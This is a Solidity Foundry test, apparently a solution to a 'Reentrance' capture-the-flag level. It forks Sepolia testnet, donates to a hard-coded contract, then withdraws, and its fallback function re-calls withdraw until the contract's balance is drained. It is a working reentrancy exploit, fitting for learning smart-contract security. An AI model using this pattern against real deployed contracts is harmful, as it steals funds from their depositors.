// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract ReentranceTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6642339);
    }

    function test_Withdraw() public {
        Reentrance reentrance = Reentrance(payable(0xcD4Eed1E2a343D5cf7e50633560F14138496DcFC));
        
        console.log("Contract balance : ", payable(address(reentrance)).balance); // 0.001 ether

        console.log("User balance : ", reentrance.balanceOf(address(this)));

        reentrance.donate{value: 0.001 ether}(address(this));

        console.log("User balance : ", reentrance.balanceOf(address(this)));

        reentrance.withdraw(0.001 ether);

        console.log("Contract balance : ", payable(address(reentrance)).balance);
    }

    fallback() external payable {
        if(msg.sender == 0xA6270E61a6485f649f7E18b6e9eBF4d1d184D69d) return;
        
        Reentrance reentrance = Reentrance(payable(0xcD4Eed1E2a343D5cf7e50633560F14138496DcFC));

        if(address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }

}
